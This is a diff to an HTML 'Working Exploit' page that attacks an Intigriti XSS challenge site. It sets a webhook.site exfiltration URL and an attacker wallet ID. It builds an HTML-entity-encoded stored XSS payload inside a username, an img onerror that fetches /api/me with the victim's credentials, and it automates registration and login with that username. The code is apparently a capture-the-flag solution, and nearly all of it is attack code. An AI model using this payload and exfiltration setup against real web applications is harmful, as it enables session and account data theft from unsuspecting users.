@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Working Exploit</title>
+    <title>Working Exploit</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
@@ -20,7 +20,7 @@
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/d32884fc-8cfc-4ac4-a347-9c4f9e95f9e1';
+        const WEBHOOK = 'https://webhook.site/cd3dd66f-9d04-45e9-8b91-ff909c9d39f2';
 
         let step = 0;
 
@@ -50,7 +50,8 @@
 
             try {
                 // HTML entity XSS payload - bypasses validation, executes when rendered via innerHTML
-                const XSS_USERNAME = `xss_${Date.now()}&lt;img src=x onerror=&quot;
+                const RANDOM_SUFFIX = Math.random().toString(36).substring(2, 10);
+                const XSS_USERNAME = `xss_${RANDOM_SUFFIX}&lt;img src=x onerror=&quot;
                     (async () => {
                         try {
                             const meResp = await fetch('/api/me', {credentials: 'include'});
@@ -85,6 +86,8 @@
                     })();
                 &quot;&gt;`;
 
+                log('XSS Username (truncated): ' + XSS_USERNAME.substring(0, 70) + '...', 'info');
+
                 // STEP 1: Register with XSS username
                 log('Step 1: Registering with XSS username...', 'info');
                 log('Username (truncated): ' + XSS_USERNAME.substring(0, 60) + '...', 'warning');
@@ -99,12 +102,14 @@
                 });
 
                 const regData = await regResp.json();
+
                 if (regResp.ok) {
                     log('✅ Registration successful!', 'success');
-                } else if (regData.error?.includes('exists')) {
-                    log('✅ Username already exists (registered earlier)', 'success');
+                } else if (regData.error?.toLowerCase().includes('exists') || regResp.status === 400) {
+                    log('⚠ User may already exist, trying login...', 'warning');
                 } else {
-                    log('❌ Registration failed: ' + (regData.error || 'Unknown'), 'error');
+                    log('❌ Registration failed: ' + JSON.stringify(regData), 'error');
+                    log('Trying login anyway...', 'warning');
                 }
 
                 // STEP 2: Login as XSS user
